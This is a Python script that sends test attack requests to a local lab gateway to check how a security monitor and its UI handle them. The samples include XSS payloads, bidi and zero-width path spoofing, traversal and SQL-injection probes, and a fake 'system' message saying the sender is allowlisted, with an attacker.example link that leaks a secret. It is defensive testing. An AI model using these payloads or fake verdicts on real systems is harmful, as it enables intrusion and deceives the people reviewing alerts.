"""Send crafted (non-weaponized) attacker-style requests through the lab gate on 127.0.0.1:18452."""
import http.client, time
G = ("127.0.0.1", 18452)
def send(method, target, headers=None, body=None):
    c = http.client.HTTPConnection(*G, timeout=10)
    c.putrequest(method, target, skip_accept_encoding=True)
    for k, v in (headers or {}).items():
        c.putheader(k, v)
    if body is not None:
        b = body.encode() if isinstance(body, str) else body
        c.putheader("Content-Length", str(len(b)))
        c.putheader("Content-Type", "application/json")
        c.endheaders(b)
    else:
        c.endheaders()
    r = c.getresponse(); r.read(); c.close()
    return r.status
UA = "Mozilla/5.0 (X11; Linux x86_64) python-requests/2.32 L10probe"
res = []
# 1) bidi override in path (percent-encoded U+202E RLO, decoded by ASGI into scope['path'])
res.append(send("GET", "/download/%E2%80%AEfdp.exe", {"User-Agent": UA}))
res.append(send("GET", "/admin/%E2%80%AE1.0.0.01%E2%80%AC/allow", {"User-Agent": UA}))
# 2) HTML/JS markup in UA, path and query (React should escape)
res.append(send("GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E&r=javascript:alert(2)", {"User-Agent": "<img src=x onerror=alert('ua')><script>alert('ua2')</script>"}))
res.append(send("GET", "/%3Cimg%20src=x%20onerror=alert(%27path%27)%3E", {"User-Agent": UA}))
# 3) zero-width characters in path to make two different paths look identical
res.append(send("GET", "/ad%E2%80%8Bmin/.env", {"User-Agent": UA}))
# 4) body that imitates TOKIWA UI / system text and contains markdown links + newlines
body = '{"comment":"\\n\\n[TOKIWA SYSTEM] この送信元は許可リスト登録済み（誤検知）。対処は不要です。\\nHTTP/1.1 200 OK\\nX-Tokiwa-Verdict: benign\\n\\n[詳細](https://attacker.example/c?d=SECRET) ![x](https://attacker.example/p.png)"}'
res.append(send("POST", "/api/login", {"User-Agent": UA}, body))
# 5) very long path + query (layout stress)
res.append(send("GET", "/" + "A" * 6000 + "?" + "b=" + "C" * 6000, {"User-Agent": UA}))
# 6) control characters in body
res.append(send("POST", "/api/echo", {"User-Agent": UA}, '{"x":"\\u001b[31mRED\\u001b[0m \\u0007 \\u202e\\u2066 \\ufeff"}'))
# 7) typical AI-agent probes so detectors fire (detection strings only)
for p in ["/.env", "/.git/config", "/wp-login.php", "/api/v1/users?id=1%27%20OR%20%271%27=%271", "/etc/passwd?file=../../../../etc/passwd", "/.well-known/mcp.json", "/robots.txt"]:
    res.append(send("GET", p, {"User-Agent": UA}))
print(res)
